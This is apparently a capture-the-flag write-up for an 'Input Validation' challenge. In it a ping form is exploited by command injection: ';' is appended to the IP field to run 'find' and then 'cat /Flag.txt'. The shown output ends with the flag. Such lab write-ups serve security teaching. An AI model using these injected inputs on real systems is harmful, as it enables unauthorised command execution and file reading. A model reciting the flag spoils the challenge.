# Input Validation
 
This challenge lets us insert an Ip address to check after i inserted IP (0.0.0.0) The program outputs results similar to the results you'd get from ping command.
This looks like the command is structed like so:

```bash
IP Address to Ping: X
ping X
```

Now we can inject commands of our own using ";"

```bash
IP Address to Ping: 0.0.0.0; find / -iname "Flag.txt"
```

This will ping the localhost then find our flkag on the machine

```bash
Command that will run:
ping 0.0.0.0; find / -iname "Flag.txt"

...Result:
...PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data. 
...64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms 
...64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms 
...64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.044 ms 
...64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms 
...--- 0.0.0.0 ping statistics --- 
...4 packets transmitted, 4 received, 0% packet loss, time 3050ms 
...rtt min/avg/max/mdev = 0.019/0.033/0.044/0.011 ms 
.../Flag.txt 
```

We can see that the flag is at /Flag.txt
Lets cat it

```bash
IP Address to Ping: 0.0.0.0; cat /Flag.txt
```

Then we get the flag

```bash
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data. 
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.023 ms 
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.046 ms 
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.047 ms 
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.039 ms 
--- 0.0.0.0 ping statistics --- 
4 packets transmitted, 4 received, 0% packet loss, time 3066ms 
rtt min/avg/max/mdev = 0.023/0.038/0.047/0.012 ms 
Flag: pluripresence 
```
